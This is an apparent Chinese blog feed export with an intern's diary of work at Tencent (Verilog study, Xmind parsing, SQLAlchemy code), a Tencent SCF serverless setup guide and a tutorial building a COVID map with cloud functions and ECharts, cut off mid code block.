早上主要是熟悉一下公司环境还有将公司配的电脑进行标准化设置。电脑配置还蛮不错的i7 9700+32G+1TSSD，公司网也是极快的，我就装上了chrome开始使用Google，感觉真的完爆了百度。后面导师让我研究一下Xilinx U20的卡（FPGA架构），以及智能的网卡DPDK。</p><p>​    很快就到中午了，导师也是很nice的和我吃了一下午饭，然后带我溜达了一圈，还去了28楼领取了腾讯发的口罩，还是比亚迪生产的。</p><p><img src="0aa79f15a16da0334e10cfedf1c85b5.jpg" alt="口罩"></p><p>​    吃完饭就可以休息了，一般大家从11:30就可以准备去吃饭了，然后中午可以休息到2点，主要我也比较难以入睡，一天靠两杯拿铁度过了。后面Leader也是带我去见了一面总监，然后给我介绍了一下组里面的情况，以及30TB/s流量的监控平台——天幕，监控了腾讯百分之98的流量，可谓是十分强大了。后面和导师交流了一下我的培养计划，发现小程序那部分内容其实有团队做完了。看来我必须直面我最薄弱的点。我本来是做Java偏上层应用的，没想到要转C++来开发底层的硬件了。而且全组唯一有FPGA经验的大佬还被当作救兵去救急了。 哈哈哈，如果转型成功那就相当于凤凰涅槃了，既是机遇也是挑战。</p><p>​    因此我第一天其实感受到压力还是蛮大的，然后第一天就收到了下午茶的福利，导师给了我一份水果捞一份甘露，看来鹅场福利还是名不虚传的。除此之外还有披萨和鸡块哈哈哈。文具、纸巾啥的也是随便拿，总的来说腾讯提供了一个特别Nice的工作环境和工作氛围，如果适应了其实感觉不到累。</p><p><img src="image-20200523100708719.png" alt="下午茶"></p><p><img src="image-20200523100747548.png" alt="福利"></p><p>​    虽然做的东西我都没有任何的经验，我还是相信自己的攻坚能力的，好好加油争取能先入个门，等入门了就会轻松一点了。</p><p>​    后面是打算工作到8点后然后在公司里面健身，然后打车回家咯，今天和好基友出去恰了个饭然后就回来了。</p><p>​    要说一点企业微信还是比钉钉人性化，虽然说钉钉是为企业服务完全不需要考虑你员工的体验，但是我还是比较喜欢腾讯的企业微信的，多了一些人性的关怀吧。</p><p>​    腾讯的瑞雪文化我也特别的喜欢，相比百度其实我心中的Dream Company就是腾讯了。希望自己能尽快的融入团队吧。</p><h2><span id="2020525">2020/5/25</span></h2><ul><li><p>早上去滨海大厦送合同，顺便参观了一下大楼。</p></li><li><p>调研FPGA的数字电路设计语言（分别有Verilog HDL和VHDL，国内和欧美使用Verilog比较多，欧洲使用VHDL比较多。通常在小型中型设计的时候使用Verilog，因为其特性比较灵活。在大型的设计中使用VHDL比较多，因为其以严谨性著称。）</p></li><li><p>使用搜索引擎搜索相关教程,开始学习Verilog HDL语言。</p><blockquote><p>​    学习了什么是Verilog HDL</p><p>​    学习了模块、时延和设计的表述方式</p><p>​    学习了标识符、注释、格式、编译命令和系统任务与函数</p></blockquote></li><li><p>了解Xmind后台项目</p></li><li><p>研究了Xmind的python包，但是存在着无法和最新版xmind软件兼容的问题。</p></li><li><p>晚上实地探勘了班车，并体验了腾讯班车。</p></li></ul><h2><span id="2020526">2020/5/26</span></h2><ul><li><p>学习Verilog HDL语言</p><blockquote><p>学习了值集合、数据类型、表达式、门电平模型化。</p></blockquote><p>记录一下Verilog语言中的 reg[MSB:LSB] a，其中a寄存器的位数为MSB-LSB+1，且其中的a是无符号整数，引用官网文档：</p><p>Vectors can be declared for all types of <strong>net</strong> data types and for <strong>reg</strong> data types. Specifying vectors for <strong>integer</strong>, <strong>real</strong>, <strong>realtime</strong>, and <strong>time</strong> data types is illegal.</p><h2><span id="examples">Examples</span></h2><p>Example 1</p><p><strong>reg</strong> [3:0] addr;</p><p>The ‘addr’ variable is a 4-bit vector register made up of addr[3] (the most significant bit), addr[2], addr[1], and addr[0] (the least significant bit).</p><p>Example 2</p><p><strong>wire</strong> [-3:4] d;</p><p>The d variable is 8-bit vector net made up of d[-3] (msb), d[-2], d[-1], d[0], d[1], d[2], d[3], d[4] (lsb).</p><p>Example 3</p><p><strong>tri</strong> [5:0] x, y, z;</p><p>The above line declares three 6-bit vectors.   </p></li></ul><p>  记录一下assign的意义，有时候用assign有时候直接赋值：</p><blockquote><p>The <strong>assign</strong> construct in Verilog is the <strong>continuous</strong> assignment statement in Verilog which is used in <strong>dataflow</strong> modelling.</p></blockquote><ul><li><p>公司的网好像用pip和npm下载一些包以及安装一些软件都装不上。</p></li><li><p>下午开始认真看Xmind项目的需求，一开始没什么头绪，晚上写完代码测试了一下层次遍历和前序遍历，决定使用层次遍历的方法。</p></li><li><p>晚上想到方法后一直睡不着，记录了一下所思考的思路。</p></li></ul><h2><span id="2020527">2020/5/27</span></h2><ul><li><p>早上还是早早的起来搭乘班车到公司</p></li><li><p>一边谷歌一边coding把我的想法实现了，应该是问题不大。</p></li><li><p>下午，构思了一下复杂模板的设计和规范，最终实现了一个demo</p><p><img src="image-20200527213647495.png" alt="简化版xmind"></p><p><img src="image-20200527213710782.png" alt="处理完的结果"></p><p><img src="image-20200527213736644.png" alt="复杂版本xmind"></p><p><img src="image-20200527213757782.png" alt="处理后的结果"></p></li><li><p>继续学习Verilog</p><blockquote><p> 组合电路与时序电路</p></blockquote></li><li><p>晚上和中心的人打篮球，打完后一身汗不方便坐大巴索性骑车回酒店</p></li><li><p>感觉这样的生活还是蛮舒服的，虽然说大城市给予自己的时间变少了，但是公司的氛围都特别融洽，慢慢感受到了瑞雪文化。越发的想留在腾讯了，我也是越来越好，越来越自信了。</p></li></ul><h2><span id="2020528">2020/5/28</span></h2><ul><li><p>按照需求修改Xmind</p><blockquote><p>修改了代码实现标签追加功能</p><p>增加了默认权限为0的操作</p><p>修改代码实现了按顺序添加属性功能</p><p>实现了区分用例标题和属性</p></blockquote><p>但是很遗憾的是xmind包不支持xmind zen版本</p><p>因此我决定改变一个思路，去找有没有将zen转为json的包，并且对json进行层次遍历，这样虽然效率低了但是也能实现功能，代码也可以复用。</p></li><li><p>继续学习Verilog</p><blockquote><p>数据流模型化</p></blockquote></li><li><p>项目经理让我帮黄博对接一下AI LAB</p></li><li><p>晚上健身+骑车回酒店</p></li></ul><h2><span id="2020529">2020/5/29</span></h2><ul><li>继续研究如何解析Xmind</li><li>放弃了自己写的解析代码，查询了相关文档使用了json库自带的功能。</li><li>完成了对JSON的解析，并且将结果封装成对象。</li><li>默认一个ZEN文档一个画布</li><li>为了代码可读性、维护性和开发的便捷性，牺牲一丢丢性能，将解析Xmind单独写成一个文件。</li><li>完成对JSON文件的解析生成模型节点，并且对模型节点解析，结合我之前的解析代码把整个Xmind文件按格式解析出来。</li></ul><h2><span id="202061">2020/6/1</span></h2><ul><li><p>继续学习Verilog</p><blockquote><p> 学习了行为建模 结构建模</p></blockquote></li><li><p>Xmind 解析项目</p><blockquote><p>优化Xmind解析算法，添加注释，加入多画布支持。</p><p>删除冗余代码，减少空间复杂度。</p><p>开会讨论下一步计划：</p></blockquote><blockquote><pre><code>1.  解析目录2.  转换成其他对象3.  容错和校验</code></pre></blockquote></li><li><p>完成解析目录和结果集转化为NodeDOList对象，元素转化为NodeDO对象。</p></li></ul><h2><span id="202062">2020/6/2</span></h2><ul><li><p>Xmind解析：</p><blockquote><p>修复了多次设置属性的bug</p><p>添加了对优先级的判错：    </p><p>​    如果是p后数字大于3小于0就报错</p><p>​    如果是标签没加#则判错，如果在优先级后写标签没加|则报错</p><p>容错：    </p><p>​    如果是小写p开头就转化成大写P</p><p>优化了代码，使用一个父类提取节点基本属性同时两个子类title_node和example_node继承父类Node</p><p>基本完成对Xmind解析的开发</p></blockquote></li><li><p>阅读Django服务器的代码，为开发后台功能做准备。</p><ul><li><p>upload_file</p><blockquote><p>流程：</p><p>​        读取到上传的文件</p><p>​        生成uuid并把“-”去除</p><p>​        缓存到本地</p><p>​        上传到服务器</p><p>​         将信息返回前端</p></blockquote></li><li><p>parse_task_status</p><blockquote><p> 获取 获取提交的解析任务 和 获取提交的用例处理任务的状态 返回前端</p></blockquote></li></ul></li><li><p>提前请假从酒店搬到租房那里了，今天刚好状态不行，早点回去了。租房还可以，坐个地铁就到公司了，终于不需要那么早起了 哈哈哈。租房条件中规中矩吧。</p></li></ul><h2><span id="202063">2020/6/3</span></h2><ul><li><p>继续阅读Django后台源码</p><ul><li><p>parse_usecase_list</p><blockquote><p>解析用例列表包含：</p><p>​    获取包含用例的个数？</p><p>​    获取传入参数所对应的用例信息</p><p>返回</p></blockquote></li><li><p>update_usecase_content</p><blockquote><p> 更新 用例内容</p><p> 判断用例是否为自动化样例 是的话就需要去做一些合法性判断</p></blockquote></li><li><p>data_import</p><blockquote><p>判断是否曾经写过数据 写过就返回，没写过就创建对象然后异步写DB</p></blockquote></li><li><p>data_import_status</p><blockquote><p>返回上传文件后的结果</p></blockquote></li><li><p>import_task_history</p><blockquote><p>获取当前登录人提交的导入任务列表</p></blockquote></li><li><p>auto_fileupload</p><blockquote><p>逻辑和auto_fileupload差不多 处理一些字段不大一样</p></blockquote></li><li><p>auto_extra_params</p><blockquote><p>获取关联的智研项目信息 并且 更新任务状态和信息</p></blockquote></li><li><p>auto_task_history</p><blockquote><p>获取git自动操作的任务记录列表</p></blockquote></li><li><p>auto_task_history_details</p><blockquote><p>获取git自动操作,指定任务的用例记录详情列表</p></blockquote></li></ul></li><li><p>开会，商量天幕后台数据解析和可视化功能。</p></li></ul><h2><span id="202064">2020/6/4</span></h2><ul><li><p>了解了一下python连接数据库的各种包以及相关的ORM包。</p></li><li><p>开会了解了一下逻辑和需求。</p></li><li><p>查看数据库并且分析哪些数据段缺失，哪些数据段需要。</p></li></ul><h2><span id="202065">2020/6/5</span></h2><ul><li><p>继续分析需求和研究数据库</p></li><li><p>查找缺失的字段。</p></li><li><p>解决了sqlachemy连接数据库的问题（enum字段）</p></li></ul><h2><span id="202068">2020/6/8</span></h2><ul><li><p>和waine最后确定需求：</p></li><li><p>通过Excel确定了无法获取的数据，并且反馈给同事。</p></li><li><p>继续研究sqlAchemy，实现了：</p><blockquote><p>对BIGINT的支持</p><p>对表存在与否判断</p><p>创建部分数据库</p><p>完成对园区，交换机，服务器表的建立。</p><p>完成了yaml配置文件的书写</p></blockquote><h2><span id="202069">2020/6/9</span></h2><ul><li><p>解决了python一个奇怪的bug（创建对象的时候还是得加（））</p></li><li><p>开发需求</p><blockquote><p>完成了将已知数据录入IDC状态表的功能</p><p>完成了将已知数据录入Server状态表的功能</p><p>完成了将已知数据录入switch状态表的功能</p></blockquote></li><li><p>树立流程：</p><blockquote><ol><li><p>对数据表进行分析，并抽取有用的数据项</p></li><li><p>对有用的数据表建立domain object实现对象和数据库之间的映射</p></li><li><p>书写业务逻辑，将表数据有机结合在一起</p></li><li><p>书写测试样例，测试业务逻辑的正确性。</p></li><li><p>对代码进行单机测试</p></li><li><p>核对需求，看看是否能满足标准</p></li><li><p>对代码Review，优化代码（ORM部分优化？）</p></li><li><p>将代码部署到服务器上，进行测试</p></li><li><p>项目迭代</p></li></ol></blockquote></li></ul></li></ul><h2><span id="2020610">2020/6/10</span></h2><ul><li><p>抽取代码 解耦</p><blockquote><p>使用default.yaml作为配置文件</p><p>代码分层：</p><p>​    DO层 ： 存放ORM对象</p><p>​    DAO层： 用于对数据库以及配置文件处理</p><p>​    Service层：实现业务逻辑</p></blockquote></li><li><p>根据需求重写逻辑</p><blockquote><p>由于代码结构的合理性，修改变得简单。</p></blockquote></li><li><p>阅读新数据库，分析抽取有用的部分，并且创建对应的ORM DO</p><blockquote><p>如何针对每天来插入数据？日期的对比？</p><p>研究python中的日期</p><p>表名根据日期变换带来的数据库表访问问题？</p></blockquote></li><li><p>建立ORM对象小技巧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96; [a-zA-Z]*.*</span><br></pre></td></tr></table></figure></li></ul><h2><span id="2020611">2020/6/11</span></h2><ul><li><p>动态改变表名</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OptServerInfoGetter</span><span class="params">(suffix, Base_class=Base)</span>:</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">OptServerRelationInfo</span><span class="params">(Base_class)</span>:</span></span><br><span class="line">     __tablename__ = <span class="string">'opt_info_'</span> + suffix</span><br><span class="line">     manageip = Column(String(<span class="number">16</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">     interface = Column(String(<span class="number">64</span>))</span><br><span class="line">     description = Column(String(<span class="number">128</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">     status = Column(String)</span><br><span class="line">     bandwidth = Column()</span><br><span class="line">     unitType = Column()</span><br><span class="line">     rateCount = Column()</span><br><span class="line">     ratePkgCount = Column()</span><br><span class="line">     outputunitType = Column()</span><br><span class="line">     outputrateCount = Column()</span><br><span class="line">     outputratePkgCount = Column()</span><br><span class="line">     orderlist = Column()</span><br><span class="line"> <span class="keyword">return</span> OptServerRelationInfo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OptServerRelationInfo = OptServerInfoGetter(<span class="string">'20200609'</span>)</span><br></pre></td></tr></table></figure></blockquote></li><li><p>继续优化代码</p><blockquote><p>​    DO： 存放ORM对象</p><p>​    DAO： 用于对数据库以及配置文件处理</p><p>​    Service：实现业务逻辑</p><p>​    Utils：实现其余工具功能</p></blockquote></li><li><p>需要讲一下卫星的项目：</p></li><li><p>讨论了一下数据的来源问题</p><blockquote><p>进制换算1k 然后峰值计算需要sum来做</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实习日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tencent-SCF</title>
      <link href="/2020/05/07/SCF/"/>
      <url>/2020/05/07/SCF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记录一下使用serverless SCF中实践的过程遇到的一些坑。</p><a id="more"></a><!-- toc --><ul><li><a href="#配置环境">配置环境</a><ul><li><a href="#设置api密钥">设置API密钥</a></li><li><a href="#设置角色">设置角色</a></li></ul></li><li><a href="#生产环境">生产环境</a><ul><li><a href="#控制台">控制台</a></li><li><a href="#cli">CLI</a></li><li><a href="#vscode推荐">VSCode（推荐）</a></li></ul></li><li><a href="#scf进阶使用">SCF进阶使用</a><ul><li><a href="#测试">测试</a></li><li><a href="#日志查询">日志查询</a></li><li><a href="#scf监控与告警">SCF监控与告警</a></li></ul></li><li><a href="#scf触发器类型以及如何配置">SCF触发器类型以及如何配置</a><ul><li><a href="#触发器类型">触发器类型</a></li><li><a href="#scf网络与配置">SCF网络与配置</a><ul><li><a href="#配置vpc">配置VPC</a></li></ul></li><li><a href="#配置环境变量">配置环境变量</a></li><li><a href="#api-explorer">API Explorer</a></li></ul></li></ul><!-- tocstop --><h1><span id="配置环境">配置环境</span></h1><h2><span id="设置api密钥">设置API密钥</span></h2><p><img src="image-20200507125902880.png" alt="设置API密钥"></p><p>登录腾讯云，在云产品中去设置一个新的秘钥。</p><h2><span id="设置角色">设置角色</span></h2><p><img src="image-20200507130010962.png" alt="设置角色"></p><p>需要注意的是我们需要为scf去设置角色，防止上传的时候出现问题。</p><p><img src="image-20200507130137864.png" alt></p><p>选择一个策略名，然后重命名为SCF_QcsRole，这个是使用命令行工具的时候运行scf deploy的时候默认上传使用的名字。</p><h1><span id="生产环境">生产环境</span></h1><h2><span id="控制台">控制台</span></h2><p>直接打开我们web端的控制台去coding</p><h2><span id="cli">CLI</span></h2><ul><li>配置python环境和pip。</li></ul><p><a href="https://cloud.tencent.com/document/product/583/33449" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/583/33449</a> 根据链接配置</p><ul><li>执行以下命令，并按照提示输入对应信息：</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ scf configure <span class="built_in">set</span></span><br><span class="line">[-] appid = <span class="number">1255721742</span></span><br><span class="line">[-] region = ap-guangzhou</span><br><span class="line">[-] secret-id = ********************************cEr7</span><br><span class="line">[-] secret-key = ****************************mkYA</span><br><span class="line">[-] using-cos = True (By default, it is deployed by COS.)</span><br><span class="line">Allow report information to <span class="built_in">help</span> us optimize scfcli(Y/n):</span><br></pre></td></tr></table></figure><h2><span id="vscode推荐">VSCode（推荐）</span></h2><p>下载tencent scf插件即可。</p><h1><span id="scf进阶使用">SCF进阶使用</span></h1><h2><span id="测试">测试</span></h2><ul><li>VSCode</li></ul><blockquote><p>使用本地调试，然后选择方法即可</p></blockquote><p><img src="image-20200507132307806.png" alt></p><ul><li>控制台</li></ul><blockquote><p>通过 函数服务-&gt; 函数代码里面选择测试方法即可</p></blockquote><p><img src="image-20200507132358519.png" alt></p><p><img src="image-20200507132425062.png" alt></p><h2><span id="日志查询">日志查询</span></h2><ul><li><p>方法一</p><blockquote><p>在控制台点击 日志查询</p></blockquote></li><li><p>方法二</p><blockquote><p>配置日志流水</p></blockquote></li></ul><p><img src="image-20200507132646019.png" alt="日志流水"></p><ol><li><p>创建日志集（地点一定要保持一致）</p><p><img src="image-20200507133349054.png" alt></p></li><li><p>创建日志主题</p><p><img src="image-20200507133421836.png" alt></p></li><li><p>创建日志索引</p><p><img src="image-20200507133451675.png" alt></p></li><li><p>云函数配置日志投递</p><p><img src="image-20200507133545799.png" alt></p></li><li><p>查询日志</p><p><img src="image-20200507133738427.png" alt></p></li></ol><p>在函数配置中可以配置日志投递信息，选择日志集就可以了。</p><h2><span id="scf监控与告警">SCF监控与告警</span></h2><ol><li><p>各项监控信息</p><blockquote><p>可以在 监控信息 里面看到</p></blockquote></li><li><p>配置告警</p><p><img src="image-20200507134302273.png" alt></p><p><img src="image-20200507134340161.png" alt></p><p><img src="image-20200507134616754.png" alt></p><p><img src="image-20200507134558753.png" alt></p><p><img src="image-20200507143042137.png" alt></p></li></ol><h1><span id="scf触发器类型以及如何配置">SCF触发器类型以及如何配置</span></h1><h2><span id="触发器类型">触发器类型</span></h2><ul><li>定时触发</li><li>COS触发</li><li>CMQ主题订阅触发</li><li>Ckafka触发</li><li>API网关触发</li></ul><h2><span id="scf网络与配置">SCF网络与配置</span></h2><p><img src="image-20200507143736842.png" alt></p><h3><span id="配置vpc">配置VPC</span></h3><p><img src="image-20200507155739972.png" alt></p><p><img src="image-20200507155713492.png" alt></p><h2><span id="配置环境变量">配置环境变量</span></h2><p><img src="image-20200507155926430.png" alt></p><h2><span id="api-explorer">API Explorer</span></h2><blockquote><p>文档-&gt;API中心-&gt;云函数-&gt;函数相关接口-&gt;运行函数-&gt;API Explorer</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCF之疫情地图</title>
      <link href="/2020/05/07/yiqing/"/>
      <url>/2020/05/07/yiqing/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><!-- toc --><ul><li><a href="#制作疫情地图">制作疫情地图</a><ul><li><a href="#准备工作">准备工作</a></li><li><a href="#效果预览">效果预览</a></li><li><a href="#知识点">知识点</a></li><li><a href="#任务一-补充云函数逻辑">任务一 补充云函数逻辑</a></li><li><a href="#任务二-给模板补充逻辑">任务二 给模板补充逻辑</a></li><li><a href="#任务三-创建-api-网关触发器">任务三 创建 API 网关触发器</a></li><li><a href="#任务四-添加自定义域名">任务四 添加自定义域名</a></li></ul></li></ul><!-- tocstop --><h1><span id="制作疫情地图">制作疫情地图</span></h1><h2><span id="准备工作">准备工作</span></h2><ol><li>进入腾讯云控制台，在左上角云产品菜单里，选择【管理与审计】-&gt; 【访问管理】，进入后在左边菜单栏中选择【访问密钥】-&gt;【API 密钥管理】，生成并获取一对 API 密钥。</li></ol><p><img src="https://camo.githubusercontent.com/89a1dd621bc76992d556458a4556ae5ad2fdd5f2/68747470733a2f2f61736b2e71636c6f7564696d672e636f6d2f64726166742f313031313631382f676570653077626163332e706e67" alt="获取腾讯云API密钥"></p><ol start="2"><li><p>在电脑安装 <code>Node.js</code> 语言运行环境，建议大于 8.0 版本。</p></li><li><p>安装 <code>VS Code</code> + <code>Tencent Serverless Toolkit</code> 插件，或者安装命令行工具。</p></li></ol><p>前者可参考文档：<a href="https://cloud.tencent.com/document/product/583/38106" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/583/38106</a><br>后台可参考文档：<a href="https://cloud.tencent.com/document/product/583/33445" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/583/33445</a></p><p>通过了解文档，或者本课程之前的章节，学习如何用<code>VS Code</code>插件或命令行工具创建和上传云函数。</p><p>学习完后，请创建一个名为 <code>yiqing</code> 的云函数。</p><ol start="4"><li>在<a href="https://github.com/lcxfs1991/tencentcloudcourse" target="_blank" rel="noopener">https://github.com/lcxfs1991/tencentcloudcourse</a>下载本课程的代码包，目录是 <code>scr/yiqing</code>，并将里面的代码覆盖刚才新创建的<code>yiqing</code>云函数中的文件。然后在该目录中命令行运行<code>npm i</code>，安装代码包的依赖。</li></ol><h2><span id="效果预览">效果预览</span></h2><p><img src="https://user-images.githubusercontent.com/3348398/73936655-44c79b00-491e-11ea-8bb1-aada7aa08cfa.png" alt="疫情地图"></p><h2><span id="知识点">知识点</span></h2><ol><li>知道如何利用工具创建和上传云函数</li><li>知道如何创建<code>API</code>网关触发器</li><li>知道如何在云函数中部署能渲染<code>HTML</code>的服务</li><li>EChart.js 的使用</li></ol><h2><span id="任务一-补充云函数逻辑">任务一 补充云函数逻辑</span></h2><p>在云函数<code>yiqing</code>的<code>index.js</code>文件中，根据步骤提示，补充以下的逻辑。其中值得注意的是，该云函数除了承担渲染 html 的能力，还承担了输出数据的能力，这完全是通过链接中的<code>api</code>参数决定。通过这样的区别输出，就省了多制作一个云函数的麻烦，可谓是一举两得。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 接受链接上的query参数api，用于判断是输出html，还是输出数数</span></span><br><span class="line"><span class="keyword">let</span> api = event.queryString.api || <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 请求疫情数据</span></span><br><span class="line"><span class="keyword">let</span> result = <span class="keyword">await</span> axios.get(</span><br><span class="line">  <span class="string">`https://view.inews.qq.com/g2/getOnsInfo?name=disease_h5`</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 中国地图数据</span></span><br><span class="line"><span class="keyword">let</span> china_map = <span class="built_in">JSON</span>.stringify(<span class="built_in">require</span>(<span class="string">'./china.json'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 解析并渲染 html 页面</span></span><br><span class="line"><span class="keyword">let</span> html = fs.readFileSync(path.resolve(__dirname, <span class="string">'./index.html'</span>), &#123;</span><br><span class="line">  encoding: <span class="string">'utf-8'</span></span><br><span class="line">&#125;);</span><br><span class="line">html = render(html, &#123; <span class="attr">disease_data</span>: result.data.data, china_map &#125;);</span><br></pre></td></tr></table></figure><p>除此以外，由于后面创建网关的时候，要使用网关的集成响应，因此必须按照以下的格式对云函数进行输出，而不能直接返回一段数据。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!api) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    isBase64Encoded: <span class="literal">false</span>,</span><br><span class="line">    statusCode: <span class="number">200</span>,</span><br><span class="line">    headers: &#123; <span class="string">'Content-Type'</span>: <span class="string">'text/html'</span> &#125;,</span><br><span class="line">    body: html</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 输出疫情数据</span></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">  isBase64Encoded: <span class="literal">false</span>,</span><br><span class="line">  statusCode: <span class="number">200</span>,</span><br><span class="line">  headers: &#123; <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span> &#125;,</span><br><span class="line">  body: result.data.data</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2><span id="任务二-给模板补充逻辑">任务二 给模板补充逻辑</span></h2><p>在云函数<code>yiqing</code>的<code>index.html</code>文件中，根据步骤提示，补充以下的逻辑。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 填充地图模板变量</span></span><br><span class="line"><span class="keyword">let</span> china_map = $&#123;china_map&#125; || <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2. 填充确诊、疑似、治愈、死亡数据</span></span><br><span class="line"><span class="keyword">let</span> chinaTotal = disease_data.chinaTotal;</span><br><span class="line"><span class="keyword">let</span> chinaAdd = disease_data.chinaAdd;</span><br><span class="line"></span><br><span class="line">$(<span class="string">'.confirm .add span'</span>).html(<span class="string">`+<span class="subst">$&#123;chinaAdd.confirm&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">'.suspect .add span'</span>).html(<span class="string">`+<span class="subst">$&#123;chinaAdd.suspect&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">'.cure .add span'</span>).html(<span class="string">`+<span class="subst">$&#123;chinaAdd.heal&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">'.dead .add span'</span>).html(<span class="string">`+<span class="subst">$&#123;chinaAdd.dead&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">$(<span class="string">'.confirm .number'</span>).html(<span class="string">`<span class="subst">$&#123;chinaTotal.confirm&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">'.suspect .number'</span>).html(<span class="string">`<span class="subst">$&#123;chinaTotal.suspect&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">'.cure .number'</span>).html(<span class="string">`<span class="subst">$&#123;chinaTotal.heal&#125;</span>`</span>);</span><br><span class="line">$(<span class="string">'.dead .number'</span>).html(<span class="string">`<span class="subst">$&#123;chinaTotal.dead&#125;</span>`</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. 处理疫情地图中的确诊数据格式</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 需要 &#123;name: 'xxx', value: 'xxx'&#125; 这样的格式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> province = disease_data.areaTree[<span class="number">0</span>].children;</span><br><span class="line"><span class="keyword">let</span> confirmData = province.map(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    name: item.name,</span><br><span class="line">    value: item.total.confirm</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4. 给疫情地图添加标题</span></span><br><span class="line">title: &#123;</span><br><span class="line">    text: <span class="string">'疫情地图'</span>,</span><br><span class="line">    subtext: <span class="string">`<span class="subst">$&#123;disease_data.lastUpdateTime&#125;</span> 更新`</span>,</span><br><span class="line">    left: <span class="string">'right'</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 